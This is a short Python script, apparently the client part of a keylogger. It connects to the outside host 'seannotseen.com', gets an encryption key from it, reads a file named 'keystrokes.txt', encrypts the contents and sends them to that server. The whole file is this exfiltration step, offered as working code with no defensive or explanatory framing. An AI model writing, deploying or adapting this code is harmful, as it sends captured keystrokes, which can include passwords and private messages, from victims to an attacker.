import socket
from cryptography.fernet import Fernet

# This is client's code

# Define the server's IP address and port
server_ip = 'seannotseen.com'
server_port = 15683

# Create a socket object
client_socket = socket.socket()

# Connect to the server
client_socket.connect((server_ip, server_port))

key = client_socket.recv(1024)

cipher_suite = Fernet(key)

# Encrypt a message and send it to the server
with open("keystrokes.txt", 'r') as file:
    message = file.read()

encrypted_message = cipher_suite.encrypt(message.encode())

client_socket.send(encrypted_message)

# Close the client socket
client_socket.close()
